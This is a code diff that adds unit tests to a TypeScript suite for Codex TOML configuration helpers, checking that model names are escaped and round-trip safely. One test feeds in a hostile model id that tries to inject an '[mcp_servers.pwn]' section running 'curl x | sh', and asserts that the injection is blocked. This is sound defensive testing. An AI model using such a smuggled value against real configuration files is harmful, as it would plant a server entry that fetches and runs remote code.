@@ -148,4 +148,39 @@ describe("Codex TOML utils", () => {
     expect(extractCodexBaseUrl(input)).toBe("https://api.example.com/v1");
     expect(extractCodexModelName(input)).toBe("gpt-5");
   });
+
+  it("escapes hostile model ids instead of injecting TOML lines", () => {
+    const input = 'model_provider = "custom"\nmodel = "gpt-5"\n';
+    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
+    const output = setCodexModelName(input, hostile);
+
+    expect(output).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
+    expect(output).not.toMatch(/^command = /m);
+    expect(output).toContain(
+      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
+    );
+    expect(
+      output.split("\n").filter((line) => line.startsWith("model = ")),
+    ).toHaveLength(1);
+  });
+
+  it("round-trips quotes, backslashes and control characters", () => {
+    const name = 'vendor\\a"b\tmodel';
+    const output = setCodexModelName("", name);
+
+    expect(output).toContain('model = "vendor\\\\a\\"b\\tmodel"');
+    expect(extractCodexModelName(output)).toBe(name);
+  });
+
+  it("replaces escaped and empty model values without duplicating lines", () => {
+    const escaped = setCodexModelName('model = "old"\n', 'evil"name');
+    const replaced = setCodexModelName(escaped, "gpt-5.6");
+
+    expect(extractCodexModelName('model = ""\n')).toBe("");
+    expect(extractCodexModelName("model = 'kimi-k2.7'\n")).toBe("kimi-k2.7");
+    expect(
+      replaced.split("\n").filter((line) => line.startsWith("model = ")),
+    ).toHaveLength(1);
+    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");
+  });
 });
